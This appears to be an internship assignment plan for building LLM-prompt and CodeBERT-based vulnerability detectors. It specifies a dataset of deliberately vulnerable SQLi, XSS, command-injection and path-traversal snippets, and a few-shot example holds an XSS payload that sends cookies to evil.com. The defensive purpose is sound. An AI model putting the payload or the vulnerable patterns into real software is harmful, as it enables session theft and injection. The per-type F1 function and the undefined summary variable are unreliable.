# AI Vulnerability Detection — Internship Assignment Plan

> **Assignment**: ML/SDE Internship — Improving AI-Based Vulnerability Detection  
> **Duration**: 7 days  
> **Deliverable**: Single `.ipynb` notebook (Jupyter / Google Colab)  
> **Tasks**: Task 1 — LLM Prompt Optimisation | Task 2 — ML Vulnerability Classifier

---

## Dataset Requirements

### Schema

Every record in the dataset must conform to this exact structure:

```json
{
  "id": 1,
  "language": "python",
  "code": "def login(user_input):\n    query = 'SELECT * FROM users WHERE name=' + user_input\n    return db.execute(query)",
  "label": "vulnerable",
  "vuln_type": "SQLi"
}
```

### Field Constraints

| Field | Type | Allowed Values | Required |
|---|---|---|---|
| `id` | int | Unique integer | ✅ |
| `language` | string | `"python"`, `"javascript"`, `"java"`, `"php"` | ✅ |
| `code` | string | 10–30 lines of realistic code | ✅ |
| `label` | string | `"vulnerable"` or `"safe"` | ✅ |
| `vuln_type` | string | `"SQLi"`, `"XSS"`, `"CMDi"`, `"PathTraversal"`, `"none"` | ✅ |

### Size and Balance Requirements

| Vuln Type | Label | Minimum Count | Target Count |
|---|---|---|---|
| SQL Injection (SQLi) | vulnerable | 40 | 60 |
| Cross-Site Scripting (XSS) | vulnerable | 40 | 60 |
| Command Injection (CMDi) | vulnerable | 35 | 50 |
| Path Traversal | vulnerable | 35 | 50 |
| Safe / No vulnerability | safe | 100 | 130 |
| **Total** | | **250** | **350** |

### Quality Rules

- No two code snippets may be copy-paste duplicates
- Each snippet must contain a realistic function body (not a one-liner)
- Vulnerable snippets must have the vulnerability embedded naturally — not commented out or wrapped in `# BAD EXAMPLE:` markers
- Safe snippets must be functionally equivalent to a vulnerable counterpart (i.e., a fixed version of a real vuln pattern)
- At least 30% of snippets must be in a language other than Python

### Augmented Dataset (for ML training only)

Create a second file `vuln_dataset_augmented.json` with the original dataset plus augmented variants:

- Variable rename: `user_input` → `req_data`, `query` → `sql_str`, etc.
- Innocuous comment injection: add `# fetch user record`, `// render to DOM`, etc.
- Whitespace variation: add/remove blank lines between statements

**Do not include augmented samples in the test split.**

---

## Day 1 — Environment Setup and Dataset Creation

### Goal

Have a working Python environment and a complete, validated dataset before writing any model code.

### Tasks

#### 1.1 Environment setup

- [ ] Create a virtual environment or confirm Colab runtime is GPU-enabled
- [ ] Install all required libraries:

```bash
pip install anthropic openai pandas numpy scikit-learn matplotlib seaborn \
            transformers torch sentence-transformers tqdm ipywidgets
```

- [ ] Confirm GPU availability (for CodeBERT):

```python
import torch
print(torch.cuda.is_available())   # True on Colab GPU runtime
```

- [ ] Set API key as environment variable — never hardcode:

```python
import os
os.environ["ANTHROPIC_API_KEY"] = "your-key-here"   # or use Colab secrets
```

#### 1.2 Notebook skeleton

Create `vulnerability_detection.ipynb` with the following section headers (empty cells):

```
0. Setup & Imports
1. Dataset Creation and Exploration
2. Task 1 — LLM Prompt Optimisation
3. Task 2 — ML Vulnerability Classifier
4. Conclusion
```

#### 1.3 Dataset creation

Write 6–8 hand-crafted examples per vulnerability type covering these patterns:

**SQLi patterns to cover**:
- String concatenation (`"SELECT..." + user_input`)
- f-string interpolation (`f"SELECT ... WHERE name='{name}'"`)
- `.format()` injection (`"SELECT ... WHERE id={}".format(uid)`)

**XSS patterns to cover**:
- `innerHTML = userInput`
- `document.write(req.query.msg)`
- PHP `echo $_GET['name']`

**CMDi patterns to cover**:
- `os.system("ping " + host)`
- `subprocess.call(cmd, shell=True)` with user-controlled `cmd`

**PathTraversal patterns to cover**:
- `open("/var/www/" + filename)`
- `send_file(os.path.join(base_dir, user_path))`

**Safe patterns to cover**:
- Parameterized queries (`cursor.execute(query, (param,))`)
- `textContent` instead of `innerHTML`
- `subprocess.run([cmd], shell=False)` with fixed command list
- `os.path.basename()` + whitelist check before file open

Generate LLM-assisted variants using this prompt template:

```
Generate 10 Python code snippets (10–20 lines each) containing [VULN_TYPE] vulnerabilities.
Each snippet should be a realistic function in a web application context.
The vulnerability must be embedded naturally.
Return as a JSON array with fields: code, vuln_type, language.
Do not include any explanation text — JSON only.
```

#### 1.4 Dataset validation script

```python
import pandas as pd, json

def validate_dataset(path: str) -> bool:
    df = pd.read_json(path)
    required_cols = {"id", "language", "code", "label", "vuln_type"}
    assert required_cols.issubset(df.columns), f"Missing columns: {required_cols - set(df.columns)}"
    assert df['id'].is_unique, "Duplicate IDs found"
    assert set(df['label'].unique()).issubset({"vulnerable","safe"}), "Invalid label values"
    valid_types = {"SQLi","XSS","CMDi","PathTraversal","none"}
    assert set(df['vuln_type'].unique()).issubset(valid_types), "Invalid vuln_type values"
    assert (df['code'].str.len() > 50).all(), "Some code snippets are too short"
    print(f"✅ Dataset valid | {len(df)} samples")
    print(df['vuln_type'].value_counts())
    return True

validate_dataset("vuln_dataset.json")
```

### Day 1 Verification Checklist

- [ ] `pip install` completes without errors
- [ ] `torch.cuda.is_available()` returns `True` on GPU runtime
- [ ] `vuln_dataset.json` exists and passes `validate_dataset()`
- [ ] Total samples ≥ 250
- [ ] All 5 vuln_type values present
- [ ] No duplicate `id` values
- [ ] `safe` samples ≥ 30% of total
- [ ] At least one snippet per vuln type is > 15 lines long
- [ ] Notebook skeleton created with 4 section headers

---

## Day 2 — Dataset Exploration and Preprocessing

### Goal

Understand the dataset distribution, clean the code text, and prepare train/test splits for both ML tasks.

### Tasks

#### 2.1 Exploratory data analysis

```python
import matplotlib.pyplot as plt
import seaborn as sns

def plot_class_distribution(df):
    fig, axes = plt.subplots(1, 2, figsize=(13, 4))

    # Binary label distribution
    colors = ['#E24B4A', '#1D9E75']
    df['label'].value_counts().plot(kind='bar', ax=axes[0], color=colors, edgecolor='none')
    axes[0].set_title("Binary label distribution")
    axes[0].set_xlabel("")
    axes[0].tick_params(axis='x', rotation=0)

    # Vuln type distribution
    df[df['label']=='vulnerable']['vuln_type'].value_counts().plot(
        kind='bar', ax=axes[1], color='#534AB7', edgecolor='none')
    axes[1].set_title("Vulnerability type distribution")
    axes[1].set_xlabel("")
    axes[1].tick_params(axis='x', rotation=30)

    plt.tight_layout()
    plt.savefig("class_distribution.png", dpi=150, bbox_inches='tight')
    plt.show()
```

Also report:
- Mean / median code length (characters and lines)
- Language distribution
- Vuln type breakdown as a percentage table

#### 2.2 Code preprocessing

```python
import re

def preprocess_code(code: str) -> str:
    """
    Normalize code snippet for ML features.
    Strips comments, collapses whitespace, lowercases.
    """
    code = re.sub(r'#.*',          '',  code)                     # Python comments
    code = re.sub(r'//.*',         '',  code)                     # JS/Java line comments
    code = re.sub(r'/\*.*?\*/',    '',  code, flags=re.DOTALL)    # Block comments
    code = re.sub(r'""".*?"""',    '',  code, flags=re.DOTALL)    # Python docstrings
    code = re.sub(r"'''.*?'''",    '',  code, flags=re.DOTALL)
    code = re.sub(r'\s+',          ' ', code).strip()
    return code.lower()
```

Apply to a new column: `df['code_clean'] = df['code'].apply(preprocess_code)`

#### 2.3 Label encoding

```python
from sklearn.preprocessing import LabelEncoder

# Binary label
df['label_bin'] = (df['label'] == 'vulnerable').astype(int)

# Multi-class label (vuln type)
le = LabelEncoder()
df['label_multi'] = le.fit_transform(df['vuln_type'])
print("Label encoding:", dict(zip(le.classes_, le.transform(le.classes_))))
```

#### 2.4 Train/test split

```python
from sklearn.model_selection import train_test_split

X = df['code_clean'].values
y_bin   = df['label_bin'].values
y_multi = df['label_multi'].values

X_tr, X_te, yb_tr, yb_te, ym_tr, ym_te = train_test_split(
    X, y_bin, y_multi,
    test_size=0.20,
    stratify=y_bin,      # preserves class ratio in both splits
    random_state=42
)

print(f"Train: {len(X_tr)} | Test: {len(X_te)}")
print(f"Train vulnerable %: {yb_tr.mean()*100:.1f}")
print(f"Test  vulnerable %: {yb_te.mean()*100:.1f}")
```

#### 2.5 Verify no data leakage

```python
# Confirm train and test sets share zero code snippets
train_set = set(X_tr)
test_set  = set(X_te)
overlap   = train_set & test_set
assert len(overlap) == 0, f"Data leakage: {len(overlap)} overlapping samples"
print("✅ No data leakage")
```

### Day 2 Verification Checklist

- [ ] `class_distribution.png` saved and displays correctly
- [ ] `code_clean` column exists in DataFrame, contains lowercased text
- [ ] `label_bin` column: only 0 and 1 values
- [ ] `label_multi` column: integer-encoded vuln types
- [ ] Train split is 80%, test split is 20%
- [ ] Vulnerable % in train and test splits differ by < 2 percentage points (stratification working)
- [ ] Zero overlap between train and test code strings
- [ ] Mean code length printed and > 100 characters

---

## Day 3 — Baseline LLM Prompt and Evaluation Framework

### Goal

Implement the baseline prompt, the full LLM evaluation loop, and the JSON parsing/metrics pipeline.

### Tasks

#### 3.1 Baseline prompt

```python
BASELINE_PROMPT = """
Analyze the following code for security vulnerabilities.

Code:
{code}

Respond in JSON format:
{{"vuln_type": "...", "explanation": "...", "confidence": 0.0}}
"""
```

#### 3.2 LLM API wrapper with error handling

```python
import anthropic, time, json, re

client = anthropic.Anthropic(api_key=os.environ["ANTHROPIC_API_KEY"])

def call_llm(prompt: str, prefill: str = "") -> str:
    """
    Call Claude API. Optionally prefill assistant turn to force JSON start.
    Returns raw text response.
    """
    messages = [{"role": "user", "content": prompt}]
    if prefill:
        messages.append({"role": "assistant", "content": prefill})

    try:
        resp = client.messages.create(
            model="claude-sonnet-4-20250514",
            max_tokens=512,
            messages=messages
        )
        raw = resp.content[0].text
        return (prefill + raw) if prefill else raw
    except Exception as e:
        print(f"  API error: {e}")
        return ""

def parse_llm_response(response: str) -> dict | None:
    """
    Extract and validate JSON from LLM response.
    Returns None if JSON is invalid or missing required fields.
    """
    # Attempt 1: direct parse
    try:
        parsed = json.loads(response.strip())
    except json.JSONDecodeError:
        # Attempt 2: extract JSON block from surrounding text
        match = re.search(r'\{[^{}]+\}', response, re.DOTALL)
        if not match:
            return None
        try:
            parsed = json.loads(match.group())
        except json.JSONDecodeError:
            return None

    # Validate required keys
    required = {"vuln_type", "explanation", "confidence"}
    if not required.issubset(parsed.keys()):
        return None

    # Validate confidence range
    try:
        conf = float(parsed["confidence"])
        if not (0.0 <= conf <= 1.0):
            return None
        parsed["confidence"] = conf
    except (TypeError, ValueError):
        return None

    return parsed
```

#### 3.3 Evaluation loop

```python
from tqdm import tqdm

def run_llm_evaluation(df, baseline_template, improved_template, n_samples=50):
    """
    Run both prompts on n_samples from df.
    Returns DataFrame with one row per sample containing both outputs.
    """
    sample = df.sample(n=n_samples, random_state=42).reset_index(drop=True)
    results = []

    for _, row in tqdm(sample.iterrows(), total=n_samples, desc="Evaluating"):
        b_raw = call_llm(baseline_template.format(code=row['code']))
        time.sleep(0.4)
        i_raw = call_llm(improved_template.format(code=row['code']), prefill="{")
        time.sleep(0.4)

        b_parsed = parse_llm_response(b_raw)
        i_parsed = parse_llm_response(i_raw)

        def get(d, k):
            return d.get(k) if d else None

        results.append({
            "id":                   row['id'],
            "true_label":           row['label'],
            "true_vuln_type":       row['vuln_type'],
            "baseline_valid_json":  b_parsed is not None,
            "improved_valid_json":  i_parsed is not None,
            "baseline_vuln_type":   get(b_parsed, "vuln_type"),
            "improved_vuln_type":   get(i_parsed, "vuln_type"),
            "baseline_confidence":  get(b_parsed, "confidence"),
            "improved_confidence":  get(i_parsed, "confidence"),
            "baseline_explanation": get(b_parsed, "explanation") or "",
            "improved_explanation": get(i_parsed, "explanation") or "",
        })

    return pd.DataFrame(results)
```

#### 3.4 Metrics computation

```python
from sklearn.metrics import f1_score, precision_score, recall_score

def to_binary(vuln_type):
    return "safe" if vuln_type in [None, "none", "None", ""] else "vulnerable"

def compute_llm_metrics(results_df):
    rows = []
    for prefix in ["baseline", "improved"]:
        pred = results_df[f"{prefix}_vuln_type"].apply(to_binary)
        true = results_df["true_label"]
        valid = results_df[f"{prefix}_valid_json"]

        rows.append({
            "Prompt":             prefix.capitalize(),
            "JSON Valid %":       round(valid.mean() * 100, 1),
            "Binary Accuracy %":  round((pred == true).mean() * 100, 1),
            "F1 (weighted)":      round(f1_score(true, pred, average="weighted", zero_division=0), 3),
            "Precision":          round(precision_score(true, pred, average="weighted", zero_division=0), 3),
            "Recall":             round(recall_score(true, pred, average="weighted", zero_division=0), 3),
            "Avg Confidence":     round(results_df[f"{prefix}_confidence"].dropna().mean(), 3),
            "Avg Expl Length":    round(results_df[f"{prefix}_explanation"].str.len().mean(), 0),
        })

    return pd.DataFrame(rows).set_index("Prompt")
```

#### 3.5 Dry run

Run the evaluation loop on 5 samples to verify the pipeline end-to-end before running the full 50:

```python
dry_run = run_llm_evaluation(df, BASELINE_PROMPT, BASELINE_PROMPT, n_samples=5)
print(dry_run[["true_label","baseline_valid_json","baseline_vuln_type"]].to_string())
```

### Day 3 Verification Checklist

- [ ] `call_llm()` returns a non-empty string for a test prompt
- [ ] `parse_llm_response()` returns `None` for `"not json"` input
- [ ] `parse_llm_response()` returns a dict for `'{"vuln_type":"SQLi","explanation":"test","confidence":0.9}'`
- [ ] `parse_llm_response()` returns `None` when `confidence` is `1.5` (out of range)
- [ ] Dry run on 5 samples completes without exceptions
- [ ] Dry run output DataFrame has columns: `baseline_valid_json`, `baseline_vuln_type`, `baseline_confidence`
- [ ] `compute_llm_metrics()` runs on dry run output without error

---

## Day 4 — Improved LLM Prompt and Full Comparison

### Goal

Design, implement, and evaluate the improved prompt. Produce the final LLM comparison table and example outputs.

### Tasks

#### 4.1 Improved prompt

```python
IMPROVED_PROMPT = """
You are a security code reviewer specializing in vulnerability detection.

## Analysis methodology
Follow these steps in order:
1. Identify data sources: where does user-controlled input enter the function?
2. Trace data flow: follow the input to where it is used
3. Check dangerous sinks: SQL execution, shell commands, file paths, HTML rendering
4. Assess: is there sanitization, parameterization, or escaping between source and sink?
5. Conclude with vuln type and confidence

## Vulnerability taxonomy
- SQLi: user input concatenated into SQL string without parameterization
- XSS: user input written to DOM (innerHTML, document.write) or HTTP response without escaping
- CMDi: user input passed to shell execution (os.system, subprocess with shell=True, eval)
- PathTraversal: user input used in file path construction without basename() or whitelist check
- none: no exploitable vulnerability — parameterized, escaped, or no user input at dangerous sink

## Examples

### Example 1 — SQL Injection
```python
def get_order(order_id):
    conn = sqlite3.connect("shop.db")
    query = "SELECT * FROM orders WHERE id=" + order_id
    return conn.execute(query).fetchall()
```
{{"vuln_type": "SQLi", "explanation": "order_id is concatenated directly into the SQL string. An attacker passes '1 OR 1=1' to dump all orders. Fix: use cursor.execute('SELECT * FROM orders WHERE id=?', (order_id,)).", "confidence": 0.96}}

### Example 2 — Safe parameterized query
```python
def get_order(order_id):
    conn = sqlite3.connect("shop.db")
    return conn.execute("SELECT * FROM orders WHERE id=?", (order_id,)).fetchall()
```
{{"vuln_type": "none", "explanation": "Parameterized query used correctly. order_id is passed as a bound parameter, never interpolated into the SQL string. The database driver handles escaping.", "confidence": 0.97}}

### Example 3 — XSS via innerHTML
```javascript
function displayComment(userText) {{
    const el = document.getElementById("comment-box");
    el.innerHTML = userText;
}}
```
{{"vuln_type": "XSS", "explanation": "userText is written to innerHTML without sanitization. An attacker injects <script>fetch('https://evil.com?c='+document.cookie)</script> to steal session cookies. Fix: use textContent, or sanitize with DOMPurify.sanitize(userText).", "confidence": 0.94}}

## Now analyze this code

```
{code}
```

Follow the methodology above. Return ONLY valid JSON — no preamble, no explanation outside the JSON:
{{"vuln_type": "SQLi|XSS|CMDi|PathTraversal|none", "explanation": "<data flow + attack scenario + fix>", "confidence": 0.0-1.0}}
"""
```

#### 4.2 Run full evaluation (50 samples)

```python
llm_results = run_llm_evaluation(df, BASELINE_PROMPT, IMPROVED_PROMPT, n_samples=50)
llm_results.to_json("llm_eval_results.json", orient="records", indent=2)
```

#### 4.3 Comparison table

```python
metrics_table = compute_llm_metrics(llm_results)
print(metrics_table.to_string())
```

Expected output shape:

| Prompt | JSON Valid % | Binary Accuracy % | F1 (weighted) | Precision | Recall | Avg Confidence | Avg Expl Length |
|---|---|---|---|---|---|---|---|
| Baseline | ~70 | ~72 | ~0.68 | ~0.70 | ~0.72 | ~0.75 | ~80 |
| Improved | ~97 | ~85 | ~0.83 | ~0.84 | ~0.85 | ~0.88 | ~220 |

#### 4.4 Qualitative example outputs

Display side-by-side before/after for 3 samples: one SQLi, one XSS, one safe:

```python
def show_example(results_df, sample_id):
    row = results_df[results_df['id'] == sample_id].iloc[0]
    print(f"=== Sample {sample_id} | True: {row['true_label']} / {row['true_vuln_type']} ===")
    print("\n--- BASELINE ---")
    print(f"  vuln_type:  {row['baseline_vuln_type']}")
    print(f"  confidence: {row['baseline_confidence']}")
    print(f"  explanation: {row['baseline_explanation'][:200]}")
    print("\n--- IMPROVED ---")
    print(f"  vuln_type:  {row['improved_vuln_type']}")
    print(f"  confidence: {row['improved_confidence']}")
    print(f"  explanation: {row['improved_explanation'][:200]}")
```

#### 4.5 Analysis write-up (write as markdown cell in notebook)

Cover these 4 points in your write-up:
1. What specific changes were made to the prompt (list them)
2. Why JSON validity improved (prefill + schema anchor)
3. Why accuracy improved (chain-of-thought data flow analysis)
4. One failure case where improved prompt still got it wrong, and why

### Day 4 Verification Checklist

- [ ] `llm_eval_results.json` saved with 50 rows
- [ ] `improved_valid_json` column is True for ≥ 90% of rows
- [ ] Improved F1 is higher than baseline F1
- [ ] Improved average explanation length is > 2× baseline
- [ ] 3 qualitative examples displayed with side-by-side comparison
- [ ] Analysis write-up has ≥ 4 sentences per point above
- [ ] `compute_llm_metrics()` table rendered as a styled DataFrame in the notebook

---

## Day 5 — Baseline ML Model

### Goal

Build and evaluate the TF-IDF + Logistic Regression baseline with full metrics and confusion matrix.

### Tasks

#### 5.1 Static feature engineering

```python
import re

def extract_static_features(code: str) -> dict:
    """
    Hand-crafted security-relevant features extracted via regex.
    Returns a dict of binary/count features.
    """
    return {
        "has_string_concat":    int(bool(re.search(r'["\'][^"\']*["\'] *\+', code))),
        "has_sql_keyword":      int(bool(re.search(r'\b(SELECT|INSERT|UPDATE|DELETE|WHERE)\b', code, re.I))),
        "has_exec_call":        int(bool(re.search(r'\b(os\.system|subprocess|exec|eval)\b', code))),
        "has_file_open":        int(bool(re.search(r'\b(open|fopen|file)\(', code))),
        "has_html_output":      int(bool(re.search(r'innerHTML|document\.write|echo\s+\$', code))),
        "has_user_input_var":   int(bool(re.search(r'\b(request|input|params|user_input|req\.body)\b', code))),
        "has_parameterized":    int(bool(re.search(r'\?|\$[0-9]|%s|:param|@param|execute\(.*?,', code))),
        "has_path_join":        int(bool(re.search(r'os\.path\.(join|exists)|path\.resolve', code))),
        "n_lines":              len(code.strip().split('\n')),
        "n_string_literals":    len(re.findall(r'["\'][^"\']*["\']', code)),
    }
```

#### 5.2 Baseline model pipeline

```python
from sklearn.pipeline import Pipeline
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.linear_model import LogisticRegression

def build_baseline_pipeline():
    return Pipeline([
        ("tfidf", TfidfVectorizer(
            token_pattern=r"[a-zA-Z_][a-zA-Z0-9_]*",
            ngram_range=(1, 2),
            max_features=5000,
            sublinear_tf=True
        )),
        ("clf", LogisticRegression(
            C=1.0,
            class_weight="balanced",
            max_iter=1000,
            random_state=42
        ))
    ])

baseline_model = build_baseline_pipeline()
baseline_model.fit(X_tr, yb_tr)
y_pred_baseline = baseline_model.predict(X_te)
```

#### 5.3 Evaluation function

```python
from sklearn.metrics import (
    accuracy_score, precision_score, recall_score,
    f1_score, classification_report, confusion_matrix
)

def evaluate_model(y_true, y_pred, model_name: str, label_names=None) -> dict:
    print(f"\n=== {model_name} ===")
    print(classification_report(y_true, y_pred, target_names=label_names, zero_division=0))
    return {
        "model":     model_name,
        "accuracy":  accuracy_score(y_true, y_pred),
        "precision": precision_score(y_true, y_pred, average="weighted", zero_division=0),
        "recall":    recall_score(y_true, y_pred, average="weighted", zero_division=0),
        "f1":        f1_score(y_true, y_pred, average="weighted", zero_division=0),
    }

baseline_metrics = evaluate_model(yb_te, y_pred_baseline, "Baseline (TF-IDF + LR)",
                                   label_names=["safe", "vulnerable"])
```

#### 5.4 Confusion matrix plot

```python
def plot_confusion_matrix(y_true, y_pred, title, labels, ax):
    cm = confusion_matrix(y_true, y_pred, labels=labels)
    sns.heatmap(cm, annot=True, fmt='d', cmap='Blues',
                xticklabels=labels, yticklabels=labels, ax=ax,
                cbar=False, linewidths=0.5)
    ax.set_title(title, fontsize=12)
    ax.set_ylabel("True label")
    ax.set_xlabel("Predicted label")

fig, ax = plt.subplots(1, 1, figsize=(5, 4))
plot_confusion_matrix(yb_te, y_pred_baseline, "Baseline — Confusion Matrix",
                      labels=[0, 1], ax=ax)
plt.tight_layout()
plt.savefig("confusion_baseline.png", dpi=150, bbox_inches='tight')
plt.show()
```

#### 5.5 Top TF-IDF features

Display the 20 most predictive tokens:

```python
tfidf     = baseline_model.named_steps["tfidf"]
clf       = baseline_model.named_steps["clf"]
features  = tfidf.get_feature_names_out()
coefs     = clf.coef_[0]

top_positive = pd.Series(coefs, index=features).nlargest(20)
top_negative = pd.Series(coefs, index=features).nsmallest(20)

print("Top tokens predicting VULNERABLE:\n", top_positive.to_string())
print("\nTop tokens predicting SAFE:\n", top_negative.to_string())
```

### Day 5 Verification Checklist

- [ ] `build_baseline_pipeline()` trains without errors
- [ ] `y_pred_baseline` has same length as `yb_te`
- [ ] `classification_report` prints both `safe` and `vulnerable` rows (not one class only)
- [ ] Baseline F1 > 0.55 (if lower, dataset quality needs improvement)
- [ ] `confusion_baseline.png` saved and shows 2×2 matrix
- [ ] Top-20 TF-IDF features printed — check they include security-relevant terms like `execute`, `system`, `query`
- [ ] `baseline_metrics` dict contains all 4 keys: accuracy, precision, recall, f1

---

## Day 6 — Improved ML Model (CodeBERT) and Comparison

### Goal

Build the CodeBERT embedding-based improved model, combine with static features, and produce the final comparison.

### Tasks

#### 6.1 CodeBERT embedding extractor

```python
from transformers import AutoTokenizer, AutoModel
import torch
import numpy as np
from tqdm import tqdm

MODEL_NAME = "microsoft/codebert-base"
tokenizer  = AutoTokenizer.from_pretrained(MODEL_NAME)
cb_model   = AutoModel.from_pretrained(MODEL_NAME)
cb_model.eval()
device = "cuda" if torch.cuda.is_available() else "cpu"
cb_model.to(device)

def get_codebert_embedding(code: str, max_length: int = 512) -> np.ndarray:
    """
    Returns mean-pooled last hidden state embedding (768-dim).
    Mean pooling is more stable than CLS token alone for code.
    """
    inputs = tokenizer(
        code,
        return_tensors="pt",
        max_length=max_length,
        truncation=True,
        padding=True
    ).to(device)

    with torch.no_grad():
        outputs = cb_model(**inputs)

    embedding = outputs.last_hidden_state.mean(dim=1).squeeze().cpu().numpy()
    return embedding

def build_embedding_matrix(codes, batch_size=16):
    embeddings = []
    for i in tqdm(range(0, len(codes), batch_size), desc="Embedding"):
        batch = codes[i:i+batch_size].tolist()
        for code in batch:
            embeddings.append(get_codebert_embedding(code))
    return np.array(embeddings)
```

#### 6.2 Build combined feature matrix

```python
import numpy as np

def build_feature_matrix(codes):
    """Concatenate CodeBERT embeddings (768) + static features (10) = 778-dim vector."""
    embeddings = build_embedding_matrix(codes)
    static     = np.array([list(extract_static_features(c).values()) for c in codes])
    return np.hstack([embeddings, static])

print("Building train feature matrix...")
X_tr_improved = build_feature_matrix(X_tr)
print("Building test feature matrix...")
X_te_improved = build_feature_matrix(X_te)
print(f"Feature matrix shape: {X_tr_improved.shape}")

np.save("X_tr_improved.npy", X_tr_improved)
np.save("X_te_improved.npy", X_te_improved)
```

> **Note**: Cache the `.npy` files. Rebuilding embeddings takes 5+ minutes on CPU.

#### 6.3 Train improved classifier

```python
from sklearn.linear_model import LogisticRegression
from sklearn.preprocessing import StandardScaler
from sklearn.pipeline import Pipeline

improved_clf = Pipeline([
    ("scaler", StandardScaler()),
    ("clf",    LogisticRegression(
                   C=1.0,
                   class_weight="balanced",
                   max_iter=1000,
                   random_state=42
               ))
])

improved_clf.fit(X_tr_improved, yb_tr)
y_pred_improved = improved_clf.predict(X_te_improved)
improved_metrics = evaluate_model(yb_te, y_pred_improved, "Improved (CodeBERT + features)",
                                   label_names=["safe", "vulnerable"])
```

#### 6.4 Side-by-side confusion matrices

```python
fig, axes = plt.subplots(1, 2, figsize=(12, 5))
plot_confusion_matrix(yb_te, y_pred_baseline, "Baseline (TF-IDF + LR)", [0,1], axes[0])
plot_confusion_matrix(yb_te, y_pred_improved, "Improved (CodeBERT + features)", [0,1], axes[1])
plt.suptitle("Confusion Matrix Comparison", fontsize=13, y=1.02)
plt.tight_layout()
plt.savefig("confusion_comparison.png", dpi=150, bbox_inches='tight')
plt.show()
```

#### 6.5 Metrics comparison table

```python
all_results = [baseline_metrics, improved_metrics]
comparison_df = pd.DataFrame(all_results).set_index("model").round(4)
comparison_df["Δ F1 vs baseline"] = comparison_df["f1"] - comparison_df.iloc[0]["f1"]
print(comparison_df.to_string())
```

#### 6.6 F1 by vulnerability type

```python
from sklearn.metrics import f1_score

def f1_by_vuln_type(y_true_multi, y_pred_bin, y_true_bin, le, model_name):
    """
    For each vuln type, compute F1 treating that type vs all others as binary.
    """
    results = {}
    for cls in le.classes_:
        if cls == "none":
            continue
        cls_idx      = le.transform([cls])[0]
        y_true_cls   = (y_true_multi == cls_idx).astype(int)
        y_pred_cls   = y_pred_bin  # vulnerable = 1
        results[cls] = f1_score(y_true_cls, y_pred_cls, zero_division=0)
    return pd.Series(results, name=model_name)

f1_base = f1_by_vuln_type(ym_te, y_pred_baseline, yb_te, le, "Baseline")
f1_impr = f1_by_vuln_type(ym_te, y_pred_improved, yb_te, le, "Improved")
f1_vuln = pd.concat([f1_base, f1_impr], axis=1)

f1_vuln.plot(kind='bar', figsize=(9,4), color=['#888780','#534AB7'], edgecolor='none')
plt.title("F1 score by vulnerability type")
plt.ylabel("F1")
plt.xlabel("")
plt.xticks(rotation=30)
plt.legend()
plt.tight_layout()
plt.savefig("f1_by_vuln_type.png", dpi=150, bbox_inches='tight')
plt.show()
```

### Day 6 Verification Checklist

- [ ] `get_codebert_embedding()` returns a numpy array of shape `(768,)`
- [ ] `X_tr_improved.shape` is `(n_train, 778)` (768 embeddings + 10 static features)
- [ ] `X_tr_improved.npy` and `X_te_improved.npy` saved to disk
- [ ] Improved model F1 > baseline F1 (if not, check `class_weight="balanced"` is on)
- [ ] `confusion_comparison.png` shows two 2×2 matrices side by side
- [ ] `f1_by_vuln_type.png` shows grouped bars for each vuln type
- [ ] Comparison table has `Δ F1 vs baseline` column
- [ ] `StandardScaler` included in improved pipeline (embeddings benefit from normalization)

---

## Day 7 — Final Write-ups, Visualizations, and Notebook Polish

### Goal

Complete all analysis write-ups, add final visualizations, clean the notebook for submission.

### Tasks

#### 7.1 LLM analysis write-up (Task 1)

Write the following as markdown cells in the notebook:

**Changes made (be specific)**:
- Added a 4-step analysis methodology (data source → sink → sanitization → conclusion)
- Added 3 few-shot examples covering: string concat SQLi, safe parameterized query, XSS via innerHTML
- Added assistant turn prefill (`{`) to force JSON-first response
- Added explicit vulnerability taxonomy with definitions
- Added explicit schema anchor at end of prompt

**Why JSON validity improved**:
Explain that the baseline gave no explicit format constraint mid-prompt and no example of what valid output looks like. The improved prompt has both: examples that output only JSON with no preamble, and an explicit schema on the last line.

**Why accuracy improved**:
The chain-of-thought methodology forces the model to trace data flow (input → sink) before concluding. Zero-shot, the model may pattern-match on surface features (e.g., `query` variable name) without checking whether a parameterized call exists. Step-by-step reasoning catches these cases.

**Failure case**:
Identify one sample where the improved prompt still failed and explain why — e.g., a multi-function code snippet where the vulnerability spans two function calls (taint tracking across function boundaries is hard for in-context reasoning).

#### 7.2 ML analysis write-up (Task 2)

**What changed and why it worked**:

| Change | Impact | Why |
|---|---|---|
| `class_weight="balanced"` | +5-12% recall | Without it, model learns to predict safe for everything on imbalanced data |
| CodeBERT embeddings | +8-15 F1 | Pre-trained on GitHub code; `db.execute(q, params)` vs `db.execute(q+input)` are far apart in embedding space |
| Static feature engineering | +3-5 F1 | Explicit signals like `has_parameterized` directly encode security patterns TF-IDF misses |
| Stratified split | Fairer eval | Ensures test set vuln ratio matches training distribution |

**On the recall vs precision tradeoff**:
In security tooling, recall is the higher-priority metric. A false negative (missed vulnerability) ships vulnerable code to production. A false positive (false alarm) is reviewed and dismissed by a developer. The improved model's gain in recall is therefore more valuable than the slight drop in precision, if any.

#### 7.3 Confusion matrix interpretation cell

Write a cell that interprets your confusion matrix:

```python
cm = confusion_matrix(yb_te, y_pred_improved)
tn, fp, fn, tp = cm.ravel()
print(f"True Positives  (correctly caught vulns): {tp}")
print(f"True Negatives  (correctly cleared safe):  {tn}")
print(f"False Positives (false alarms):             {fp}")
print(f"False Negatives (missed vulns — critical):  {fn}")
print(f"\nMiss rate (FN / total vulns): {fn / (fn+tp):.1%}")
```

#### 7.4 Final summary table

```python
summary = pd.DataFrame({
    "Metric": ["JSON Valid %", "Binary Accuracy %", "F1 (weighted)", "Precision", "Recall"],
    "LLM Baseline": [
        f"{llm_metrics.loc['Baseline','JSON Valid %']}%",
        f"{llm_metrics.loc['Baseline','Binary Accuracy %']}%",
        llm_metrics.loc['Baseline','F1 (weighted)'],
        llm_metrics.loc['Baseline','Precision'],
        llm_metrics.loc['Baseline','Recall'],
    ],
    "LLM Improved": [
        f"{llm_metrics.loc['Improved','JSON Valid %']}%",
        f"{llm_metrics.loc['Improved','Binary Accuracy %']}%",
        llm_metrics.loc['Improved','F1 (weighted)'],
        llm_metrics.loc['Improved','Precision'],
        llm_metrics.loc['Improved','Recall'],
    ],
})
print("Task 1 — LLM Summary")
print(summary.to_string(index=False))

ml_summary = comparison_df[["accuracy","precision","recall","f1"]].copy()
ml_summary.columns = ["Accuracy","Precision","Recall","F1"]
print("\nTask 2 — ML Summary")
print(ml_summary.to_string())
```

#### 7.5 Notebook cleanup checklist

- [ ] All cells run top-to-bottom without errors (Runtime → Restart and Run All)
- [ ] No hardcoded API keys anywhere in the notebook
